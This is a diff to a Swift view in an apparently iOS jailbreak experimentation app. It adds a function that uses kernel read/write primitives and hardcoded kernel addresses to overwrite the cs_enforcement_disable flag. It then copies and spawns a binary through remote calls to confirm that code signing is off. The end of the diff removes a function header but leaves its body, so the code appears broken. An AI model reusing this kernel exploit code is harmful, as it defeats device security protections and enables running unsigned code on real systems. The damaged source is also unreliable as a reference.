@@ -371,11 +371,17 @@ struct AMFIExperimentView: View {
             
             // ============================================
             // 🔥 Experiment 40: PATCH pmap_cs_allow_invalid_internal!
-            // THE BREAKTHROUGH — variable in __DATA, writable via KRW!
-            // Write 1 → disable code signing → run ANY binary!
             // ============================================
             let exp40 = self.expPatchCSEnforcement(rc: rc)
             experimentResults.append(exp40)
+            
+            // ============================================
+            // 🔥🔥 Experiment 41: PATCH cs_enforcement_disable!
+            // Variable pointed to by __DATA_CONST pointer
+            // Actual variable is in __DATA (writable!)
+            // ============================================
+            let exp41 = self.expPatchCSEnforcementDisable(rc: rc)
+            experimentResults.append(exp41)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -2378,12 +2384,131 @@ struct AMFIExperimentView: View {
         }
     }
     
+    /// 🔥🔥 Patch cs_enforcement_disable — the REAL disable flag!
+    /// Pointer at __DATA_CONST (0xfffffff007b78390) points to variable in __DATA
+    /// Pointer value from file: 0x3160350 → maps to __DATA at vm 0xfffffff00a164350
+    /// Also try: read the pointer at runtime to get ACTUAL variable address
+    private func expPatchCSEnforcementDisable(rc: RemoteCall) -> ExperimentResult {
+        let mgr = dspmgr.shared
+        let slide = mgr.kernslide
+        
+        var detail = "🔥🔥 cs_enforcement_disable patch attempt\n\n"
+        
+        // The pointer to cs_enforcement_disable is at __DATA_CONST:
+        // Unslid: 0xfffffff007b78390
+        let ptrAddr = UInt64(0xfffffff007b78390) + slide
+        detail += "Pointer location: 0x\(String(format: "%llx", ptrAddr)) (__DATA_CONST)\n"
+        
+        // Read the pointer to get actual variable address
+        let varPtrRaw = ds_kread64(ptrAddr)
+        detail += "Pointer value (raw): 0x\(String(format: "%llx", varPtrRaw))\n"
+        
+        // Strip PAC bits if present
+        let varAddr = varPtrRaw & 0x0000007FFFFFFFFF
+        detail += "Variable addr (stripped): 0x\(String(format: "%llx", varAddr))\n\n"
+        
+        // Also try calculated address
+        let calcAddr = UInt64(0xfffffff00a164350) + slide
+        detail += "Calculated addr: 0x\(String(format: "%llx", calcAddr))\n\n"
+        
+        // Try reading from both addresses
+        var targetAddr: UInt64 = 0
+        
+        if varAddr != 0 && ds_isvalid(varAddr) {
+            let val = ds_kread32(varAddr)
+            detail += "Read from pointer target: 0x\(String(format: "%x", val))\n"
+            targetAddr = varAddr
+        } else {
+            detail += "Pointer target not valid, trying calculated...\n"
+        }
+        
+        if targetAddr == 0 && ds_isvalid(calcAddr) {
+            let val = ds_kread32(calcAddr)
+            detail += "Read from calculated: 0x\(String(format: "%x", val))\n"
+            targetAddr = calcAddr
+        }
+        
+        // Also try: the pointer value might BE the variable (not a pointer to it)
+        // In __DATA_CONST, value 0x3160350 at file offset 0xb74390
+        // This might be an offset, not an address
+        // Try: kernel_base + 0x3160350
+        let altAddr = mgr.kernbase + 0x3160350
+        if ds_isvalid(altAddr) {
+            let altVal = ds_kread32(altAddr)
+            detail += "Alt (base+0x3160350): 0x\(String(format: "%x", altVal)) at 0x\(String(format: "%llx", altAddr))\n"
+            if targetAddr == 0 { targetAddr = altAddr }
+        }
+        
+        detail += "\n"
+        
+        guard targetAddr != 0 else {
+            detail += "❌ Could not find valid target address\n"
+            return ExperimentResult(name: "🔥🔥 CS_ENFORCEMENT_DISABLE", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Read current value
+        let currentVal = ds_kread32(targetAddr)
+        detail += "Target: 0x\(String(format: "%llx", targetAddr))\n"
+        detail += "Current value: 0x\(String(format: "%x", currentVal))\n\n"
+        
+        // Write 1 to disable
+        detail += "Writing 1 to disable cs_enforcement...\n"
+        ds_kwrite32(targetAddr, 1)
+        
+        let afterVal = ds_kread32(targetAddr)
+        detail += "After write: 0x\(String(format: "%x", afterVal))\n\n"
+        
+        if afterVal == 1 && currentVal != 1 {
+            detail += "✅ WRITE SUCCEEDED!\n\n"
+            
+            // TEST: spawn copied binary
+            let mem = rc.trojanMem
+            let srcPath = remote_alloc_str(rc, "/bin/df")
+            let dstPath = remote_alloc_str(rc, "/tmp/.dsp_cs_test")
+            
+            let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+            let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+            
+            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+                let bufAddr = mem + 0x800
+                for _ in 0..<100 {
+                    let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
+                    if n == 0 || n > 2048 { break }
+                    RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
+                }
+                RootExecutor.rcall(rc, "close", srcFd)
+                RootExecutor.rcall(rc, "close", dstFd)
+                
+                let argvBase = mem + 0x1C00
+                rc[argvBase].setValue64(dstPath)
+                rc[argvBase + 8].setValue64(0)
+                let pidAddr2 = mem + 0x1A00
+                rc[pidAddr2].setValue64(0)
+                
+                let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, 0, argvBase, 0)
+                RootExecutor.rcall(rc, "usleep", 1000000)
+                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+                
+                detail += "Spawn copied binary: ret=\(spawnRet), wait=\(waitRet)\n"
+                if spawnRet == 0 {
+                    detail += "\n🎉🎉🎉 COPIED BINARY RUNS!!! FULL JAILBREAK!!! 🎉🎉🎉\n"
+                }
+                
+                RootExecutor.rcall(rc, "unlink", dstPath)
+            }
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            
+        } else if afterVal == currentVal {
+            detail += "❌ Write had no effect (PPL blocked or wrong address)\n"
+        } else {
+            detail += "⚠️ Value changed to 0x\(String(format: "%x", afterVal)) (unexpected)\n"
+        }
+        
+        return ExperimentResult(name: "🔥🔥 CS_ENFORCEMENT_DISABLE", success: afterVal == 1 && currentVal != 1, detail: detail, timestamp: Date())
+    }
+    
     /// Spawn from SpringBoard context instead of launchd
-    /// SpringBoard is uid=501 but NOT PID 1 — might handle pointers differently
-    /// Also: SpringBoard has different entitlements
-    private func expSpawnFromSpringBoard() -> ExperimentResult {
-        guard let sb = dspmgr.shared.sbProc else {
-            return ExperimentResult(name: "spawn from SpringBoard", success: false, detail: "SpringBoard RC not available", timestamp: Date())
         }
         
         let mem = sb.trojanMem
